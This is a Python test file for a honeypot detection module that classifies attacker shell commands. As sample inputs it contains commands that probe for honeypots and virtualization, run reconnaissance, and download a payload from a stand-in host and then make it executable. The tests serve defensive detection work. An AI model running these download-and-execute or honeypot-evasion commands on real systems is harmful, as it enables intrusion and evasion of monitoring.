from datetime import UTC, datetime
from pathlib import Path

from sqlalchemy.orm import sessionmaker

from honeynet.cowrie import normalize_lines
from honeynet.database import Base, StoredEvent, build_engine
from honeynet.detections import analyze_session
from honeynet.repository import EventRepository

FIXTURES = Path(__file__).parents[1] / "fixtures"


def _fixture_events(tmp_path: Path, filename: str, session_id: str) -> list[StoredEvent]:
    engine = build_engine(f"sqlite:///{tmp_path / 'detections.db'}")
    Base.metadata.create_all(engine)
    local_session = sessionmaker(bind=engine, expire_on_commit=False)
    with (FIXTURES / filename).open(encoding="utf-8") as stream:
        normalized = list(normalize_lines(stream))
    with local_session() as session:
        EventRepository(session).add_many(normalized)
        return EventRepository(session).session_events(session_id)


def _command_event(command: str, event_id: str = "test-command") -> StoredEvent:
    return StoredEvent(
        event_id=event_id,
        event_type="command_input",
        timestamp=datetime(2026, 8, 21, 9, 0, tzinfo=UTC),
        sensor_id="test-sensor",
        session_id="test-session",
        source_ip="192.0.2.20",
        source_port=50000,
        destination_port=2222,
        data={"command": command},
        source_event=None,
    )


def test_detects_honeypot_probe_with_explainable_evidence(tmp_path: Path) -> None:
    events = _fixture_events(tmp_path, "cowrie_honeypot_probe.jsonl", "cowrie-probe-001")

    detections = analyze_session(events)
    by_category = {item.category: item for item in detections}

    assert set(by_category) == {"honeypot_probe", "system_discovery"}
    probe = by_category["honeypot_probe"]
    assert probe.score == 68
    assert [item.value for item in probe.evidence] == [
        "cat /proc/1/cgroup",
        "systemd-detect-virt",
        "grep -R cowrie /opt 2>/dev/null",
    ]
    serialized = probe.model_dump()
    assert "synthetic-probe-only" not in str(serialized)
    assert "203.0.113.91" not in str(serialized)


def test_plain_system_discovery_is_not_mislabeled_as_honeypot_probe() -> None:
    detections = analyze_session([_command_event("uname -a && id")])

    assert [item.category for item in detections] == ["system_discovery"]


def test_transfer_and_execution_preparation_are_separate_detections() -> None:
    events = [
        _command_event("curl https://payload.invalid/a -o /tmp/a"),
        _command_event("chmod +x /tmp/a", "test-command-2"),
    ]

    categories = {item.category for item in analyze_session(events)}

    assert categories == {"execution_preparation", "payload_delivery"}
